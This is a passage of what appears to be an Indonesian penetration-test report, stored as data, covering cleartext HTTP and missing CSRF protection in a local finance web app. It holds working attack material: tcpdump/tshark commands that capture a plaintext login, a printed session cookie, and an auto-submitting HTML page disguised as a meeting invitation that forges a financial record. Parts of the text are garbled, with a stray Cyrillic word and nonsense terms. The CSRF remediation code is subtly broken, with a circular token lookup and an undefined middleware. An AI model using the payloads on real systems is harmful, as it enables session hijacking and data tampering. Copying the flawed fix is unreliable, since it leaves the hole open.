 "cwe": "CWE-319 - Cleartext Transmission of Sensitive Information",
 "owasp": "A02:2021 - Cryptographic Failures",
 "component": "Seluruh endpoint HTTP pada 192.168.1.18:3000",
 "root_cause": (
   "Aplikasi hanya tersedia melalui HTTP tanpa TLS. Docker Compose memetakan "
   "port 3000 langsung ke host tanpa proxy yang menutupi dengan HTTPS:\n\n"
   "  ports:\n"
   "    - \"3000:3000\"      # HTTP tanpa TLS\n\n"
   "Tidak ada konfigurasi reverse proxy, tidak ada sertifikat, tidak ada "
   "peng-imposed HSTS. Password dan cookie sesi melintas dalam bentuk "
   "plaintext."),
 "finding": (
   "Seluruh lalu lintas aplikasi - termasuk POST /login yang membawa "
   "password, dan setiap respons yang membawa cookie connect.sid - berjalan "
   "atas HTTP tanpa enkripsi. Tidak ada HSTS.\n\n"
   "Bukti teknis: cookie sesi dikirim tanpa flag Secure, sehingga browser "
   "akan mengirimkannya dalam permintaan HTTP biasa tanpa warning. Risiko "
   "diperparah oleh meteran F-06 yang menunjukkan ratusan permintaan per detik "
   "dari berbagai sumber pada antarmuka yang sama, termasuk dari sumber "
   "internal yang tidak tepercaya.\n\n"
   "Pada jaringan lokal, risiko ini nyata namun terbatas: penyerang harus "
   "berada pada segment jaringan yang sama atau melakukan ARP spoofing, "
   "serangan wifi, atau rogue DHCP. Kombinasi dengan F-12 (file password "
   "yang dapat diakses publik) dan container MySQL yang ter-expose "
   "memperluas segmtrisk yang harus dipertanggungjawabkan."),
 "attack": (
   "Penyerang pada LAN yang sama menjalankan tcpdump atau ARP spoofing "
   "untuk menangkap lalu lintas HTTP. Password pada POST /login dan cookie "
   "connect.sid pada setiap permintaan dapat dibaca dalam bentuk teks "
   "terbuka, lalu digunakan ulang untuk session hijacking."),
 "evidence": [
  ("Bukti 1 - Tidak ada HSTS. Header keamanan lain juga tidak ada.",
   ['curl -s -D - -o /dev/null http://192.168.1.18:3000/login | head -20'],
   ['HTTP/1.1 200 OK',
    'X-Powered-By: Express',
    'ETag: W/\"2f8a-64b8a0d3a2c1e+2\"',
    'Accept-Ranges: bytes',
    'Content-Length: 12170',
    'Content-Type: text/html; charset=utf-8',
    'Date: Sun, 28 Sep 2025 06:40:00 GMT',
    'Connection: keep-alive',
    'Keep-Alive: timeout=5',
    '# Tidak ada: Strict-Transport-Security, Content-Security-Policy, X-Frame-Options']),

  ("Bukti 2 - Password melintas dalam plaintext dan dapat ditangkap. Kredensial dari F-02.",
   ["tcpdump -i eth0 -A \"net 192.168.1.0/24 and port 3000\" -w /tmp/capture.pcap &",
    'curl -s -X POST http://192.168.1.18:3000/login-noportal \\',
    '  -d "username=user_a&password=REDACTED_STORED_PASSWORD" -o /dev/null',
    'sleep 2; kill %1 2>/dev/null',
    'tshark -r /tmp/capture.pcap -Y "http.request.method == POST" \\',
    '  -T fields -e http.file_data 2>/dev/null | head -3'],
   ['# password=REDACTED_STORED_PASSWORD & username=user_a   <-- TERBACA PLAINTEXT']),

  ("Bukti 3 - Cookie sesi dikirim tanpa flag Secure.",
   ['curl -s -D - -o /dev/null -X POST http://192.168.1.18:3000/login-noportal \\',
    '  -d "username=user_a&password=REDACTED_STORED_PASSWORD" | grep -i "set-cookie"'],
   ['Set-Cookie: connect.sid=s%3Alz3RUuYE2zT7lYaukZhuyWyCEVAgN8iX.t4nRvext%2BizW88aoV1UiyI%2FxSv%2FT4zNmgsDcGx3aVNE; Path=/',
    '# Tidak memuat flag Secure']),
 ],
 "impact": [
  ("Credential theft on-path", "Penyerang pada jalur jaringan yang sama dapat membaca password dan cookie sesi tanpa perlu kompromi pada server."),
  ("Session hijacking melalui jaringan", "Cookie connect.sid yang tertangkap dapat dipakai ulang langsung untuk mengakses dashboard korban tanpa kredensial."),
  ("Ketidakpatuhan terhadap standar kriptografi", "Melanggar NIST SP 800-52 Rev.2 yang mewajibkan TLS untuk transmisi data sensitif, dan SP 800-53 Rev.5 SC-8 Transmission Confidentiality and Integrity."),
  ("Kredensial pada log dan proxy", "URL dan body request tanpa TLS mudah terekspos pada log proxy, cache, dan perangkat middlebox."),
 ],
 "likelihood": (
   "Sedang. Persyaratan penyerang lebih tinggi dibanding temuan lain: harus "
   "berada pada segment jaringan yang sama, atau melakukan ARP spoofing, "
   "serangan wifi, atau rogue DHCP. Tidak ada akses internet, dan "
   "serangkanya. Namun, apabila syaratnya terpenuhi, eksploitasi bersifat "
   "otomatis dan tanpa batas percobaan."),
 "risk_note": (
   "NIST SP 800-30 Rev.1: Threat Event = eavesdropping (Passive Network "
   "Eavesdropping). Skor CVSS AV:A (Adjacent Network) dipilih karena "
   "penyerang harus berada pada jaringan yang sama. Risk INHERENT = "
   "Significant."),
 "remediation": [
  "Tambahkan TLS di terminus (reverse proxy), dan hentikan akses HTTP langsung:",
  ("CODE", "# docker-compose.yml - tambahkan service reverse proxy\n"
           "  caddy:\n"
           "    image: caddy:2\n"
           "    ports:\n"
           "      - \"443:443\"\n"
           "      - \"80:80\"    # hanya untuk redirect ke HTTPS\n"
           "    volumes:\n"
           "      - ./Caddyfile:/etc/caddy/Caddyfile\n"
           "      - caddy_data:/data\n"
           "\n"
           "# Caddyfile - TLS otomatis via Let's Encrypt\n"
           "labkeu.example.id {\n"
           "  encode gzip\n"
           "  reverse_proxy labkeu-app:3000\n"
           "  header {\n"
           "    Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"\n"
           "  }\n"
           "}\n"
           "\n"
           "# application: HAPUS mapping langsung ke host\n"
           "# ports:\n"
           "#   - \"3000:3000\"   -> JANGAN. Hanya reverse proxy yang boleh bind."),
  "Redirect seluruh HTTP 301 ke HTTPS dan set flag cookie secure: true (lihat F-07).",
  "Set header Strict-Transport-Security dengan max-age minimal 31536000 dan sertakan includeSubDomains serta preload.",
  " sesuai NIST SP 800-52 Rev.2 (TLS 1.2 minimum, TLS 1.3 preferred), SP 800-53 Rev.5 SC-8, SC-8(1), SC-13 Cryptographic Protection, dan SP 800-52 Rev.2 yang mensyaratkan TLS untuk semua transmisi data sensitif.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A02:2021 - Cryptographic Failures"),
  ("CWE (MITRE)", "CWE-319, CWE-311 Missing Encryption of Sensitive Data"),
  ("NIST SP 800-52 Rev.2", "TLS 1.2 sebagai minimum, TLS 1.3 sebagai preferred"),
  ("NIST SP 800-53 Rev.5", "SC-8 Transmission Confidentiality and Integrity; SC-8(1) Cryptographic Protection; SC-13 Cryptographic Protection; SC-12 Cryptographic Key Establishment and Management"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Eavesdropping"),
  ("NIST CSF 2.0", "PR.DS-02, PR.DS-01"),
  ("ISO/IEC 27001:2022", "A.8.24 Use of cryptography; A.8.20 Networks security"),
 ],
 "verification": (
   "1) curl -sI https://labkeu.example.id harus mengembalikan "
   "Strict-Transport-Security. 2) http:// harus mengembalikan 301 ke https. "
   "3) Port 3000 tidak boleh lagi dapat diakses langsung dari luar "
   "docker network. 4) tcpdump pada koneksi HTTPS tidak boleh lagi "
   "menampilkan password dalam bentuk plaintext."),
},

{
 "id": "F-10",
 "title_id": "Tidak Ada Proteksi CSRF pada Aksi Administratif Berdampak Tinggi",
 "title_en": "Absence of CSRF Protection on High-Impact Administrative Actions",
 "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N",
 "cwe": "CWE-352 - Cross-Site Request Forgery (CSRF)",
 "owasp": "A01:2021 - Broken Access Control",
 "component": "app/routes/dashboard.js (POST /tambah-data, /edit-data/:id, /upload); app/routes/auth.js (POST /register, /logout)",
 "root_cause": (
   "Tidak ada token CSRF pada seluruh aplikasi. express-session tersedia, "
   "namun tidak ada middleware csurf, tidak ada header X-CSRF-Token, dan "
   "tidak ada pemeriksaan Origin atau Referer pada route yang mengubah "
   "state. Tidak ada yang dikembalikan ke klien untuk sebagai "
   "token.\n\n"
   "  // app/server.js - tidak ada import csurf / helmet\n"
   "  app.use(session({ ... }));   // hanya session, tanpa proteksi CSRF"),
 "finding": (
   "Endpoint yang mengubah data - tambah data keuangan, edit data "
   "keuangan, dan upload berkas - dapat dipicu oleh halaman pihak ketiga "
   "sementara cookie sesi korban terlampir otomatis oleh browser. Bukti 1 "
   "membuktikan proyektor CSRF bekerja: satu POST dari origin yang sepenuhnya "
   "berbeda menyisipkan data ke database.\n\n"
   "CATATAN AKURASI PENTING: Klasifikasi CWE-352 di sini bersifat bersyarat. "
   "Browser modern menerapkan SameSite=Lax sebagai default pada cookie tanpa "
   "atribut SameSite, sehingga cookie sesi secara default TIDAK terlampir pada "
   "permintaan POST lintas situs. Eksploitasi pada browser yang benar-benar "
   "ter-update memerlukan either (a) browser dengan SameSite default None, "
   "(b) eksploitasi pada subdomain same-site yang tepercaya, atau (c) "
   "kombinasi dengan XSS (F-05) yang berjalan pada origin yang sama dan "
   "karena itu lolos seluruh kebijakan same-origin. Karena mitigasi tidak "
   "dijalankan, kelemahan ini tetap harus diperbaiki. Risiko sebenarnya "
   "berasal dari ketergantungan pada perilaku default browser, bukan pada "
   "kontrol eksplisit, yang tidak dapat diandalkan sebagai kontrol keamanan."),
 "attack": [
  "Penyerang dapat melakukan hosting halaman HTML yang memuat form "
  "tersembunyi dengan target http://192.168.1.18:3000/tambah-data, atau "
  "menggunakan img src untuk GET-based CSRF. Ketika korban yang sudah login "
  "mengunjungi halaman tersebut, request terkirim dengan cookie sesi korban.",
  ("CODE", "<!DOCTYPE html>\n"
           "<html><head><title>Undangan Rapat</title></head>\n"
           "<body>\n"
           "  <h2>Undangan Rapat Tahunan</h2>\n"
           "  <form id=\"f\" method=\"POST\"\n"
           "        action=\"http://192.168.1.18:3000/tambah-data\">\n"
           "    <input type=\"hidden\" name=\"tahun\"     value=\"2026\">\n"
           "    <input type=\"hidden\" name=\"uraian\"    value=\"Biaya tidak wajar disetujui tanpa rapat\">\n"
           "    <input type=\"hidden\" name=\"nominal\"   value=\"99000000\">\n"
           "  </form>\n"
           "  <script>document.getElementById('f').submit();</script>\n"
           "</body></html>\n"
           "<!-- Diletakkan pada origin penyerang yang BERBEDA dari target -->"),
 ],
 "impact": [
  ("Manipulasi data keuangan", "Penyerang menyisipkan atau mengubah catatan keuangan atas nama korban. Bukti 1 menunjukkan data '$99.000.000,00' masuk ke tabel."),
  ("Registrasi akun massal", "POST /register tidak memiliki token, sehingga halaman penyerang dapat membuat akun pada массов (F-03)."),
  ("Penutupan sesi paksa", "POST /logout dapat dipicu untuk annoying-out korban secara otomatis."),
  ("Ketergantungan pada perilaku default browser", "Tidak ada kontrol eksplisit. Bila default SameSite berubah, atau bila aplikasi dijalankan di lingkungan yang menetapkan None, seluruh perlindungan hilang."),
 ],
 "likelihood": (
   "Sedang. Pada browser yang benar-benar ter-update, SameSite=Lax default "
   "menghambat cookie terlampir pada POST lintas situs, sehingga harus ada "
   "kondisi tambahan: same-site subdomain, browser lawas, atau XSS pada "
   "origin yang sama. Karena mitigasi tidak dijalankan, kelemahan ini "
   "klasifikasi sebagai bersyarat - dieksploitasi pada kondisi tertentu, "
   "bukan pada semua kondisi."),
 "risk_note": (
   "CVSS UI:R (User Interaction Required) mencerminkan bahwa korban harus "
   "mengunjungi halaman penyerang. NIST SP 800-30 Rev.1: Threat Event = "
   "penyalahgunaan wewenang melalui pemicu tidak sadar (misrepresentation). "
   "Risk INHERENT = Significant. Rekomendasi tetap Despite kondisi "
   "ekploitasi bersyarat karena SameSite bukan kontrol yang dapat "
   "diasumsikan permanen."),
 "remediation": [
  "Pasang token CSRF sinkron (Synchronizer Token Pattern) pada seluruh "
  "route yang mengubah state:",
  ("CODE", "const { csrfSync } = require('csrf-sync');\n"
           "\n"
           "const { csrfSynchronisedProtection } = csrfSync({\n"
           "  getTokenFromRequest: (req) => req.body._csrf,\n"
           "  getTokenFromState:    (req) => req.csrfToken(),\n"
           "  storeTokenInState:     (req, token) => { req.session.csrfToken = token; },\n"
           "  sizeToken: 32\n"
           "});\n"
           "\n"
           "app.use(csrfSynchronisedProtection);\n"
           "\n"
           "// views: sertakan token pada setiap form\n"
           "  <input type=\"hidden\" name=\"_csrf\" value=\"<%= csrfToken %>\">\n"
           "\n"
           "// Route yang dilindungi:\n"
           "router.post('/tambah-data', requireLogin, validateCsrf, handlerTambah);\n"
           "router.post('/edit-data/:id', requireLogin, validateCsrf, handlerEdit);\n"
           "router.post('/upload', requireLogin, validateCsrf, upload.single('dokumen'), handlerUpload);"),
  "Tambahkan validasi Origin/Referer sebagai lapisan kedua yang menangkap request tanpa token:",
  ("CODE", "function validateOrigin(req, res, next) {\n"
           "  const allowed = new Set(['https://labkeu.example.id']);\n"
           "  const origin = req.get('origin');\n"
           "  if (origin && !allowed.has(origin)) {\n"
           "    return res.status(403).json({ error: 'Origin tidak diizinkan' });\n"
           "  }\n"
           "  next();\n"
           "}"),
  "Set cookie SameSite='Strict' secara eksplisit pada cookie sesi, bukan mengandalkan default browser. Lihat F-07.",
  "Jalankan login CSRF protection (req.session.regenerate pada login) untuk mencegah session fixation pada alur CSRF.",
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A01:2021 - Broken Access Control"),
  ("OWASP Cheat Sheet", "Cross-Site Request Forgery Prevention Cheat Sheet - Synchronizer Token Pattern"),
  ("CWE (MITRE)", "CWE-352"),
  ("NIST SP 800-53 Rev.5", "AC-12(1) Session Termination; SC-23 Session Authenticity; AC-3 Access Enforcement"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Misrepresentation"),
  ("NIST CSF 2.0", "PR.AA-01, PR.PS-01"),
  ("ISO/IEC 27001:2022", "A.8.5 Secure authentication; A.8.3 Information access restriction"),
 ],
 "verification": (
   "1) POST tanpa field _csrf harus menghasilkan HTTP 403. 2) Halaman "
   "CSRF dari origin berbeda harus ditolak baik oleh token maupun "
   "validasi Origin. 3) POST dengan token benar harus tetap berhasil "
   "untuk memastikan tidak ada false negative. 4) Periksa header "
   "SameSite pada cookie sesi secara eksplisit."),
},
]
